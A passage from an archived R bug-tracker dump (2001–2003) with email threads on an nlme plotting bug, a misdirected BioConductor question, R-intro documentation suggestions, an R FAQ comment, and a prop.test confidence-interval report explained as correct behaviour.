but lsegments expects arguments named x0,y0,x1,y1 not x1,y1,x2,y2

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907


==> 2986.followup.1 <==
From deepayan@stat.wisc.edu Mon May 12 19:43:28 2003
Received: from sabe.cs.wisc.edu (sabe.cs.wisc.edu [128.105.6.20])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h4CHhR2b019699;
	Mon, 12 May 2003 19:43:27 +0200 (MET DST)
Received: from bates1.stat.wisc.edu (bates1.stat.wisc.edu [128.105.5.131])
	(authenticated (0 bits))
	by sabe.cs.wisc.edu (8.11.3/8.11.3) with ESMTP id h4CHhQ915378
	(using TLSv1/SSLv3 with cipher RC4-MD5 (128 bits) verified NO);
	Mon, 12 May 2003 12:43:26 -0500
From: Deepayan Sarkar <deepayan@stat.wisc.edu>
To: p.dalgaard@biostat.ku.dk
Subject: Re: [Rd] plot.ranef.lme (PR#2986)
Date: Mon, 12 May 2003 12:46:19 -0500
User-Agent: KMail/1.5.1
Cc: R-bugs@biostat.ku.dk
References: <200305121614.h4CGEP2b019381@pubhealth.ku.dk>
In-Reply-To: <200305121614.h4CGEP2b019381@pubhealth.ku.dk>
MIME-Version: 1.0
Content-Type: text/plain;
  charset="iso-8859-1"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline
Message-Id: <200305121246.19059.deepayan@stat.wisc.edu>

On Monday 12 May 2003 11:14 am, p.dalgaard@biostat.ku.dk wrote:
> library(nlme)
> data(Phenobarb)
> na.include <- function(x)x
> phe1 <- nlme(conc~phenoModel(Subject, time, dose, lCl, lV),
>      data  = Phenobarb,
>      fixed = lCl+lV~1,
>      random= pdDiag(lCl+lV~1),
>      start = c(-5,0),
>      na.action = na.include,
>      naPattern = ~!is.na(conc))
>
> phe.ranef <- ranef(phe1,augFrame=TRUE)
> plot(phe.ranef, form=lCl~Wt+ApgarInd)
>
> [Error in max(length(x0), length(x1), length(y0), length(y1)) :
>         Argument "x0" is missing, with no default]
>
> The cause is plain to see: in plot.ranef.lme we have
>
>             staple.ends <- list(x1 = c(rep(X - w, 2), rep(X +
>                 w, 2)), y1 = rep(c(Y[5], max(Y[1] - e.u, Y[2])),
>                 2), x2 = c(rep(X - w, 2), rep(X + w, 2)), y2 =
> rep(c(min(Y[5] +                e.l, Y[4]), Y[1]), 2)) . . . .
>             do.call("lsegments", c(staple.ends, box.umbrella))
>
> but lsegments expects arguments named x0,y0,x1,y1 not x1,y1,x2,y2

I have seen this problem before and I remember fixing lsegments to work with 
both forms of the arguments. But the CVS doesn't have the fix, so I guess I 
made it somewhere temporarily and forgot to add it to CVS, sorry. I'll fix 
this for the next release.

Deepayan

==> 2986.audit <==
Tue May 13 15:12:14 2003	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3197 *
Subject: split.AffyBatch
From: johannes.freudenberg@imise.uni-leipzig.de
Date: Thu, 5 Jun 2003 16:05:00 +0200 (MET DST)
--about BioConductor package affy
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3197 <==
From johannes.freudenberg@imise.uni-leipzig.de Thu Jun  5 16:05:01 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h55E502b010233
	for <R-bugs@biostat.ku.dk>; Thu, 5 Jun 2003 16:05:00 +0200 (MET DST)
Date: Thu, 5 Jun 2003 16:05:00 +0200 (MET DST)
Message-Id: <200306051405.h55E502b010233@pubhealth.ku.dk>
From: johannes.freudenberg@imise.uni-leipzig.de
To: R-bugs@biostat.ku.dk
Subject: split.AffyBatch

Full_Name: Johannes Freudenberg
Version: Version 1.6.2  (2003-01-10)
OS: Unix (SunOS 5.9 )
Submission from: (NULL) (139.18.75.39)


Hi, 

I tried your example from the website (http://www.r-project.org/) and I get the
following error message:

> data(affybatch.example)
> f <- factor(c("a", "a", "b"))
> split(affybatch.example, f)
Error in initialize(value, ...) : Invalid names for slots of class exprSet:
ncol, nrow, cdfName

Same with split.AffyBatch:
> split.AffyBatch(affybatch.example, f)
Error in initialize(value, ...) : Invalid names for slots of class exprSet:
ncol, nrow, cdfName

What can I do?

Sincerely,
Johannes Freudenberg

==> 3197.followup.1 <==
From ripley@stats.ox.ac.uk Thu Jun  5 17:03:40 2003
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h55F3e2b010478
	for <R-bugs@biostat.ku.dk>; Thu, 5 Jun 2003 17:03:40 +0200 (MET DST)
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.12.9/8.12.9) with ESMTP id h55F3eUK008488;
	Thu, 5 Jun 2003 16:03:40 +0100 (BST)
Date: Thu, 5 Jun 2003 16:03:39 +0100 (BST)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender: ripley@gannet.stats
To: johannes.freudenberg@imise.uni-leipzig.de
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] split.AffyBatch (PR#3197)
In-Reply-To: <200306051405.h55E512b010237@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.44.0306051601210.1215-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

What is this referring to?

At a guess it is one of the BioConductor packages, for which that is not 
the master URL.

R-bugs is for bug reports on R, not for questions about unspecified 
contributed packages.

On Thu, 5 Jun 2003 johannes.freudenberg@imise.uni-leipzig.de wrote:

> Full_Name: Johannes Freudenberg
> Version: Version 1.6.2  (2003-01-10)

Not the current version of R, might well be the problem.

> OS: Unix (SunOS 5.9 )
> Submission from: (NULL) (139.18.75.39)
> 
> I tried your example from the website (http://www.r-project.org/) and I get the
> following error message:
> 
> > data(affybatch.example)
> > f <- factor(c("a", "a", "b"))
> > split(affybatch.example, f)
> Error in initialize(value, ...) : Invalid names for slots of class exprSet:
> ncol, nrow, cdfName
> 
> Same with split.AffyBatch:
> > split.AffyBatch(affybatch.example, f)
> Error in initialize(value, ...) : Invalid names for slots of class exprSet:
> ncol, nrow, cdfName
> 
> What can I do?


-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272866 (PA)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 3197.audit <==
Thu Jun  5 18:56:52 2003	ripley	changed notes
Thu Jun  5 18:56:52 2003	ripley	foobar
Thu Jun  5 18:56:52 2003	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3198 *
From: "Johannes Freudenberg" <johannes.freudenberg@imise.uni-leipzig.de>
--part of 3197
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3198 <==
From johannes.freudenberg@imise.uni-leipzig.de Thu Jun  5 17:22:56 2003
Received: from news.uni-leipzig.de (news.uni-leipzig.de [139.18.25.3])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h55FMt2b010566
	for <R-bugs@biostat.ku.dk>; Thu, 5 Jun 2003 17:22:56 +0200 (MET DST)
Received: from hogwarts.imise.uni-leipzig.de (hogwarts.imise.uni-leipzig.de [139.18.158.153])
	by news.uni-leipzig.de (Postfix) with ESMTP
	id 1C4EB5C0; Thu,  5 Jun 2003 17:22:56 +0200 (METDST)
Received: by hogwarts.imise.uni-leipzig.de (Postfix on SuSE Linux eMail Server 3.0, from userid 30)
	id F079D1454E; Thu,  5 Jun 2003 17:22:55 +0200 (CEST)
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
X-Accept-Language: de, en
X-Priority: 3 (Normal)
X-Mailer: SKYRiXgreen_3.1 NGMime_4.2.45
references: <Pine.LNX.4.44.0306051601210.1215-100000@gannet.stats>
From: "Johannes Freudenberg" <johannes.freudenberg@imise.uni-leipzig.de>
MIME-Version: 1.0
subject: Re: [Rd] split.AffyBatch (PR#3197)
To: "Prof Brian Ripley" <ripley@stats.ox.ac.uk>
content-type: text/plain; charset="iso-8859-1"
date:  Thu, 05 Jun 2003 17:22:55 +0200
content-transfer-encoding: 7bit
Message-Id: <20030605152255.F079D1454E@hogwarts.imise.uni-leipzig.de>

> What is this referring to?
> 
> At a guess it is one of the BioConductor packages, for which that is not 
> the master URL.
> 
> R-bugs is for bug reports on R, not for questions about unspecified 
> contributed packages.

Well, I guess I got confused with all the frames on your website.  Here's the
URL: http://finzi.psych.upenn.edu/R/library/affy/html/AffyBatch-class.html.  I
used your search engine and got directly to that page assuming that I was still
on the R website and not on some unspecified contributed website.

> > Version: Version 1.6.2  (2003-01-10)
> 
> Not the current version of R, might well be the problem.

I guess...
-- 

==> 3198.audit <==
Thu Jun  5 18:57:11 2003	ripley	changed notes
Thu Jun  5 18:57:11 2003	ripley	foobar
Thu Jun  5 18:57:11 2003	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Analyses

none

Directory:  Documentation

* PR# 988 *
Subject: input for R-intro
From: "Paul E. Johnson" <pauljohn@ku.edu>
Date: Mon, 18 Jun 2001 13:57:10 -0500
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 988 <==
From pauljohn@ku.edu  Mon Jun 18 21:03:09 2001
Received: from lark.cc.ku.edu (root@lark.cc.ku.edu [129.237.34.2])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA14694
	for <r-bugs@biostat.ku.dk>; Mon, 18 Jun 2001 21:03:08 +0200 (MET DST)
Received: from ku.edu by lark.cc.ku.edu (8.8.8/1.1.8.2/12Jan95-0207PM)
	id OAA0000024737; Mon, 18 Jun 2001 14:02:11 -0500 (CDT)
Sender: pauljohn@lark.cc.ku.edu
Message-ID: <3B2E4F06.F3198537@ku.edu>
Date: Mon, 18 Jun 2001 13:57:10 -0500
From: "Paul E. Johnson" <pauljohn@ku.edu>
X-Mailer: Mozilla 4.77 [en] (X11; U; Linux 2.4.2-2 i686)
X-Accept-Language: en
MIME-Version: 1.0
To: r-bugs@biostat.ku.dk
Subject: input for R-intro
Content-Type: multipart/mixed;
 boundary="------------1C95DB321C5D7CBC643B8CA3"

This is a multi-part message in MIME format.
--------------1C95DB321C5D7CBC643B8CA3
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

I asked Prof. Brian Ripley if I might submit some text/input for the
R-intro writers, he said this is the place to do it.

I was on a plane a couple of weeks ago reading R-intro as I plan for a
course and made these notes, some of which I think will help my students
if you incorporate them.  I've attached a raw text file I wrote in Emacs
to this message "Rintrochanges.txt".

I have written documents like R-intro before and understand it is
difficult to please everybody, and I thank you for your effort on the
project.

Paul Johnson
Assoc. Professor
Dept. of Political Science
University of Kansas

--------------1C95DB321C5D7CBC643B8CA3
Content-Type: text/plain; charset=us-ascii;
 name="Rintrochanges.txt"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="Rintrochanges.txt"

R-intro comments/enhancements  Part I.

I think something more verbose like this would help under
"Ordered and Unordered factors"

Texts on research design emphasize that variables have
different levels of measurement. Typically, there are three levels.
If a measurement is taken with a precise scale (one on which it is
meaningful to say new_value = b*old_value, as with readings of a
thermometer), it is considered an "interval" level variable.  Many
statistical models were originally designed for interval level
variables.  If a measurement is not so precise, but only provides an
ordered categorization of observations, such as "low" "medium" and
"high", it is called an ordinal variable.  If a measurement is
categorical and implies no sense of ordering, such as "European",
"Asian", or "South American", then it is typically called an ordinal
variable.  Assigning the values of "1", "2", and "3" to these
observations has no substantive significance, as we might as well
number them "3","2","1".

Many statistical models are designed for interval level data, but with
appropriate recoding of input, they can also be made to work with
nominal and ordinal data.  In the "old days" of statistical computing,
users were forced to create a lot of indicator (or "dummy") variables,
thereby converting information from nominal or ordinal measurements
into variables that have only values 0 and 1.  For example, to
represent the information about the home continents of survey
respondents, we might create two dummy variables, one for Asia (coded
1 if respondent is from Asia, 0 otherwise) and one for South America
(likewise 0 and 1).  A respondent for whom we find both of these dummy
variables equal to 0 is sure to be from Europe, so we don't usually
need to create three dummy variables.  Doing so would be redundant.

With a modern language like R, much of the drudgery of creating the
indicator variables is handled automatically if the user declares the
variables properly.  In R, and S before it, the term "factor" is used
to refer to a variable that is not measured at the interval level. An
"unordered factor" is a nominal (or categorical) variable, while an
"ordered factor" is the term for an ordinal measurement.  Many
statistical procedures in R have builtin procedures for handling
factors.

Beyond handling coding of noninterval variables, factors play a vital
role in many R procedures.  Procedures can be designed to do a chore
for each value of a factor.  Many procedures will in fact insist that
a variable be designated as a factor.

 ------------------


In this section "Named arguments and defaults", I am left in a
confusion about a few things.  This confusion has bothered me a while.
Can you do more to explain which arguments must be specified, which
are optional, and under what conditions is it necessary to include the
parameter= which calling a function.

1.  When I use a function, and I look in its help page, how do I know
which input variables must be declared and which can be ignored?  This
is quite mysterious.  When invocations leave out some arguments, how
does R "sift through" the ones that are provided to know which is
which?


For example, consider the page on "update.packages".  

Under Usage, I find:
update.packages(lib.loc = .lib.loc, CRAN = getOption("CRAN"),
                contriburl = contrib.url(CRAN),
                method = "auto", instlib = NULL,
                ask=TRUE, available=NULL, destdir=NULL)

I've been using computers a long time, and I use this function every two months or so.  Between times I forget, come back to this page, and still this one leaves me totally confused.  

After fiddling a while, I find this works on Linux:
>update.packages(lib="/usr/lib/R/library",CRAN="http://lib.stat.cmu.edu/R/CRAN")

but what bothered me thd most is the "getOption("CRAN") option for CRAN.  I tried many variations on that and never figured how to make it work.


Maybe any clarifications could be related to the section "Getting help with functions and features"

In this section, I think it would be nice to have a paragraph about
"how to read a help page."  Some things are not obvious to all new
users.  Some things in help pages are tough to describe... Maybe I'd
say

How to read a help page.

If you find a help page, notice that it is made up of different parts.

1. "Description". These are usually terse, so read every word
   carefully.

2. Look for the "Value" heading.  That tells you what this procedure is
   going to return when you call it. If this procedure doesn't return
   what you need, you should find out immediately.

3. Under "Usage", most help pages list a number of possible commands
   that can be used.  These are not commands to be typed
   literally. Many of them contain abstract references which provide
   information about the nature of the variables that might be
   entered.  

   Here is a simple case.  The coefficients help page has this:

Usage

coef(object, ...)
coefficients(object, ...)

   Clearly, coef and coefficients are going to do the same thing, and you must supply the appropriate object.

4. Under "Arguments," the help page indicates what inputs this
   procedure wants.  The inputs are described line-by-line, and often
   the comments indicate of parameters are optional or what their
   default value might be.

   Many help pages have the infamous "...", which is something like
   "fill in the appropriately, depending on whatever context you
   find."  In some situations this is easy to understand .  Many help
   pages will eplicitly say that "..." refers to any options that
   might be used with a particular kind of object, and in that case
   one must find the help page for that other object. For example, the
   dev.copy help page clearly indicates that "..." refers to any
   options that might be used with the particular device in question.

   Other help pages are not so informative.  Consider the output from ?coefficients:

Arguments

 object
       an object for which the extraction of model coefficients is meaningful.
 ...
       other arguments.

Here it is clear you need to give a statistical object to have
coefficients removed.  The "..." is a mystery, and most R users will
try to use the coefficients command without worrying about it, and
then backtrack if an error occurs.  And, if an error occurs, there may be no recourse but to read the source code for this command or ask  about it in the r-help email list.

--------------1C95DB321C5D7CBC643B8CA3--


==> 988.audit <==
Tue Jun 19 09:07:09 2001	ripley	moved from incoming to Documentation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1011 *
Subject: R-intro suggestions part II
From: "Paul E. Johnson" <pauljohn@ukans.edu>
Date: Tue, 03 Jul 2001 15:50:06 -0500
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1011 <==
From pauljohn@ukans.edu  Tue Jul  3 22:55:21 2001
Received: from lark.cc.ku.edu (root@lark.cc.ku.edu [129.237.34.2])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA25420
	for <r-bugs@biostat.ku.dk>; Tue, 3 Jul 2001 22:55:20 +0200 (MET DST)
Received: from ukans.edu by lark.cc.ku.edu (8.8.8/1.1.8.2/12Jan95-0207PM)
	id PAA0000007085; Tue, 3 Jul 2001 15:55:12 -0500 (CDT)
Sender: pauljohn@lark.cc.ku.edu
Message-ID: <3B422FFE.F4450D57@ukans.edu>
Date: Tue, 03 Jul 2001 15:50:06 -0500
From: "Paul E. Johnson" <pauljohn@ukans.edu>
X-Mailer: Mozilla 4.77 [en] (X11; U; Linux 2.4.2-2 i686)
X-Accept-Language: en
MIME-Version: 1.0
To: r-bugs@biostat.ku.dk
Subject: R-intro suggestions part II
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

Brian Ripley said that, if I sent these here, they might find their way
to the R-intro team.  So, here is another installment:


Concerning this section:

Data permanency and removing objects.

This is the first place R-intro discusses objects.  I was thinking a
better discussion of objects and syntax is needed, perhaps here, or in
the later section "Objects, their modes and attributes."  I suggest
this:


The fact that R is an object-oriented approach to programming for
statistical analysis has pervasive implications.  If one has studied a
programming language like Java or C++, the notions of object and
method are not new.  For readers who have not studied languages like
that, perhaps we can offer a brief explanation.  An object is a "self
contained data holder" that can follow instructions (do calculations,
provide values).  One intention of this design is to keep things
separate if they belong that way, to reduce the risk that one
calculation accidentally influences the result of another.
Object-orientation also has important implications for the way the
different parts of a program fit together.  Since an object is
supposed to be able to carry out a certain set of actions (which are
called methods, but in R one often says "functions" or "procedures"),
then both the user and the programmer understand what the object can
be expected to do.  There are numerous implications of object
orientation that come into play "under the hood" of the R statistical
engine, but it is not important to delve into them from a user's point
of view.


There is one wrinkle about the syntax of R that we hasten to
emphasize.  In object-oriented computer languages, syntax typically
puts the object first, followed by the instruction, followed any needed
parameters.  In Java, to tell the object "regression" to calculate
estimates for vectors y and x, one would write something like:

   regression.estimate(y,x);

Assuming that object's class has an "estimate" method which knows how
to handle the input, we would be in business.

In R, the syntax is totally different.  Instead of thinking of the
object itself as the primary thing, the syntax in R is designed to use
the method name--the instruction--as the leading concept, and then the
object that is being acted upon is given as a parameter.

When a model gives a result in R, the result is almost invariably an
object, which can then be "poked and prodded" with other methods.
If a linear regression is calculated, for example:

resultObject <- lm(y~x)

the return value is an object.  But, unlike other object-oriented
languages, in R one would write summary(resultObject), or
coefficients(resultObject), rather than the Java style
result_object.summary() or some such thing, in order to investigate the
result.


Paul E. Johnson
Political Science
University of Kansas


==> 1011.audit <==
Fri Aug  3 11:30:05 2001	ripley	moved from incoming to Documentation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1772 *
Subject: bug(?) in R FAQ - Should I run R from within Emacs?
From: Tim.Harrold@csiro.au
Date: Thu, 11 Jul 2002 18:21:42 +1000
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1772 <==
From Tim.Harrold@csiro.au  Thu Jul 11 10:22:31 2002
Received: from bastion1.vic.csiro.au (bastion1.vic.CSIRO.AU [138.194.2.8])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA17393
	for <r-bugs@biostat.ku.dk>; Thu, 11 Jul 2002 10:22:29 +0200 (MET DST)
From: Tim.Harrold@csiro.au
Received: from bastion1.vic.csiro.au (localhost [127.0.0.1])
	by bastion1.vic.csiro.au (8.11.4/8.11.4) with ESMTP id g6B8Ljv13431
	for <r-bugs@biostat.ku.dk>; Thu, 11 Jul 2002 18:21:45 +1000 (EST)
Received: from pcexch.dar.csiro.au (pcexch.dar.csiro.au [138.194.146.21])
	by bastion1.vic.csiro.au (8.11.4/8.11.4) with ESMTP id g6B8Lit13427;
	Thu, 11 Jul 2002 18:21:45 +1000 (EST)
Received: by pcexch.dar.csiro.au with Internet Mail Service (5.5.2653.19)
	id <33DQ5CHV>; Thu, 11 Jul 2002 18:21:43 +1000
Message-ID: <BE3FDFA0E846D311B264009027887568021F9571@pcexch.dar.csiro.au>
To: r-bugs@biostat.ku.dk
Cc: ripley@stats.ox.ac.uk
Subject: bug(?) in R FAQ - Should I run R from within Emacs?
Date: Thu, 11 Jul 2002 18:21:42 +1000
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2653.19)
Content-Type: text/plain;
	charset="iso-8859-1"

I have a small request re.

R FAQ
Frequently Asked Questions on R
Version 1.5-10, 2002-06-13
ISBN 3-901167-51-X
Kurt Hornik


In section 6.2 Should I run R from within Emacs? The faq says

"Yes, definitely." 

This led me to install emacs, and to install ess. However, I use a windows
environment (mswindows2000) and I had some difficulty installing, linking
and launching these applications. After several hours I had launched emacs
but had failed to link it with either ess or r, partly because of platform
problems. (As a dedicated windows user, I am reluctant to tinker with
autoexec.bat and the like).

I spent several hours doing this, and in hindsight, I decided to uninstall
emacs and ess.
 
I would prefer if the faq could be changed to say:

"This is optional."

And perhaps some comment could be made about platforms. I found the
documentation for emacs and ess to be a bit of a hair-pulling exercise. NOT
one of the "plug and play" applications that MS windows is so fond of! 

By the way, I like the r gui very much. I used splus for some time as a PhD
student, and I was pleasantly surprised to find that my scripts run in r!! I
intend to use r from now onwards, and to encourage my colleagues to use it
too.

Kind regards,

Tim Harrold
CSIRO Atmospheric Research
107 Station Street Aspendale Vic 3195
Phone: 03 9239 4411  Fax: 03 9239 4688
Home: 03 9571 2736
email tim.harrold@csiro.au
"Give thanks to the Lord, for he is good."
Psalm 106:1 

==> 1772.audit <==
Wed Jul 17 09:19:26 2002	ripley	moved from incoming to Documentation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2794 *
Subject: prop.test  confidence intervals
From: rbaer@kcom.edu
Date: Fri, 18 Apr 2003 19:01:03 +0200 (MET DST)
--prop.test should say how it computes confidence intervals.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2794 <==
From rbaer@kcom.edu Fri Apr 18 19:01:04 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3IH13pD022320
	for <R-bugs@biostat.ku.dk>; Fri, 18 Apr 2003 19:01:04 +0200 (MET DST)
Date: Fri, 18 Apr 2003 19:01:03 +0200 (MET DST)
Message-Id: <200304181701.h3IH13pD022320@pubhealth.ku.dk>
From: rbaer@kcom.edu
To: R-bugs@biostat.ku.dk
Subject: prop.test  confidence intervals

Full_Name: Robert W. Baer, Ph.D.
Version: 1.6.2
OS: Windows 2000
Submission from: (NULL) (198.209.172.106)


Problem:  prop.test() does not seem to produce appropriate confidence intervals
for the case where the vector length of x and n is one.  (I am not certain about
higher vector lengths.)

As an example, I include x=6 and n=42 which has a mean proportion of 0.115. 
When I calculate the 95% CI using the normal approximation by hand (and no
continuity correction) I get (0.028, 0.202).  The exact binomial CI from
binom.test() is (0.044, 0.234).  With correct=FALSE prop.test produces CI95 =
(0.05396969, 0.22971664) which is neither of these.  With correct=TRUE it
produces  (0.04778925, 0.2412937) This seems reasonably like a normal
approximation 95% CI (which I presume is what is used by prop.test()) of the
true binomial but I did not actually check it by hand.

BUG summary.  The prop.test() calculation of 95% CI of sample proportions is
improperly calculated when continuity correction is turned off.

-----------------------------
Sample R code and output shown below:


> x= 6;n=52
> prop.test(x,n,correct=TRUE)

        1-sample proportions test with continuity correction

data:  x out of n, null probability 0.5 
X-squared = 29.25, df = 1, p-value = 6.362e-08
alternative hypothesis: true p is not equal to 0.5 
95 percent confidence interval:
 0.04778925 0.24129372 
sample estimates:
        p 
0.1153846 

> prop.test(x,n,correct=FALSE)

        1-sample proportions test without continuity correction

data:  x out of n, null probability 0.5 
X-squared = 30.7692, df = 1, p-value = 2.906e-08
alternative hypothesis: true p is not equal to 0.5 
95 percent confidence interval:
 0.05396969 0.22971664 
sample estimates:
        p 
0.1153846 

> binom.test(x,n)

        Exact binomial test

data:  x and n 
number of successes = 6, number of trials = 52, p-value = 1.033e-08
alternative hypothesis: true probability of success is not equal to 0.5 
95 percent confidence interval:
 0.0435412 0.2344083 
sample estimates:
probability of success 
             0.1153846 


==> 2794.followup.1 <==
From tlumley@u.washington.edu Fri Apr 18 20:53:46 2003
Received: from mxout3.cac.washington.edu (mxout3.cac.washington.edu [140.142.32.166])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3IIripD022635
	for <R-bugs@biostat.ku.dk>; Fri, 18 Apr 2003 20:53:45 +0200 (MET DST)
Received: from homer28.u.washington.edu (homer28.u.washington.edu [140.142.8.38])
	by mxout3.cac.washington.edu (8.12.1+UW03.04/8.12.1+UW02.12) with ESMTP id h3IIrfSL003028;
	Fri, 18 Apr 2003 11:53:42 -0700
Received: from localhost (tlumley@localhost)
	by homer28.u.washington.edu (8.12.1+UW03.04/8.12.1+UW02.12) with ESMTP id h3IIreAa096050;
	Fri, 18 Apr 2003 11:53:40 -0700
Date: Fri, 18 Apr 2003 11:53:40 -0700 (PDT)
From: Thomas Lumley <tlumley@u.washington.edu>
To: rbaer@kcom.edu
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] prop.test  confidence intervals (PR#2794)
In-Reply-To: <200304181701.h3IH15pD022324@pubhealth.ku.dk>
Message-ID: <Pine.A41.4.44.0304181137320.79606-100000@homer28.u.washington.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Fri, 18 Apr 2003 rbaer@kcom.edu wrote:

> Full_Name: Robert W. Baer, Ph.D.
> Version: 1.6.2
> OS: Windows 2000
> Submission from: (NULL) (198.209.172.106)
>
>
> Problem:  prop.test() does not seem to produce appropriate confidence intervals
> for the case where the vector length of x and n is one.  (I am not certain about
> higher vector lengths.)
>
> As an example, I include x=6 and n=42 which has a mean proportion of 0.115.
> When I calculate the 95% CI using the normal approximation by hand (and no
> continuity correction) I get (0.028, 0.202).  The exact binomial CI from
> binom.test() is (0.044, 0.234).  With correct=FALSE prop.test produces CI95 =
> (0.05396969, 0.22971664) which is neither of these.  With correct=TRUE it
> produces  (0.04778925, 0.2412937) This seems reasonably like a normal
> approximation 95% CI (which I presume is what is used by prop.test()) of the
> true binomial but I did not actually check it by hand.
>
> BUG summary.  The prop.test() calculation of 95% CI of sample proportions is
> improperly calculated when continuity correction is turned off.

No, it isn't a bug.  It uses a Normal approximation, but not the one you
were using. It is based on inverting the score test rather than the Wald
test, and is substantially more accurate.

Checking by simulation: n=42, p=0.1, 10,000 replicates, the coverage from
prop.test without correction was 96.7%, with correction was 97.9% and from
the Wald-based Normal approximation was 92.3%.


	-thomas




==> 2794.audit <==
Fri Apr 18 21:57:39 2003	thomas	changed notes
Fri Apr 18 21:57:39 2003	thomas	foobar
Fri Apr 18 21:57:39 2003	thomas	moved from incoming to Documentation

==> 2794.reply.1 <==
From p.dalgaard@biostat.ku.dk Fri Apr 18 23:10:50 2003
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3ILAnpD022966;
	Fri, 18 Apr 2003 23:10:49 +0200 (MET DST)
Received: from blueberry.kubism.ku.dk (localhost.localdomain [127.0.0.1])
	by blueberry.kubism.ku.dk (8.12.8/8.12.8) with ESMTP id h3ILD48e026673;
	Fri, 18 Apr 2003 23:13:04 +0200
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.12.8/8.12.8/Submit) id h3ILD4wi026669;
	Fri, 18 Apr 2003 23:13:04 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: rbaer@kcom.edu
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] prop.test  confidence intervals (PR#2794)
References: <200304181701.h3IH15pD022324@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 18 Apr 2003 23:13:03 +0200
In-Reply-To: <200304181701.h3IH15pD022324@pubhealth.ku.dk>
Message-ID: <x2he8v4ihs.fsf@biostat.ku.dk>
Lines: 33
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

rbaer@kcom.edu writes:

> As an example, I include x=6 and n=42 which has a mean proportion of 0.115. 

...n=52...

> When I calculate the 95% CI using the normal approximation by hand (and no
> continuity correction) I get (0.028, 0.202).  The exact binomial CI from
> binom.test() is (0.044, 0.234).  With correct=FALSE prop.test produces CI95 =
> (0.05396969, 0.22971664) which is neither of these.  With correct=TRUE it
> produces  (0.04778925, 0.2412937) This seems reasonably like a normal
> approximation 95% CI (which I presume is what is used by prop.test()) of the
> true binomial but I did not actually check it by hand.
> 
> BUG summary.  The prop.test() calculation of 95% CI of sample proportions is
> improperly calculated when continuity correction is turned off.

Uhm... Basically, we know the correct answer from binom.test, and R's
intervals are considerably closer to that than the textbook p+-2*se(p)
formula. So R has a bug because it isn't inaccurate enough??

This might enlighten you:

prop.test(6,52,p=.05396969,alt="g",correct=F)
prop.test(6,52,p=.22971664,alt="l",correct=F)

also, consider the case x=0.

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Graphics

* PR# 202 *
Subject: persp box occlusion bug
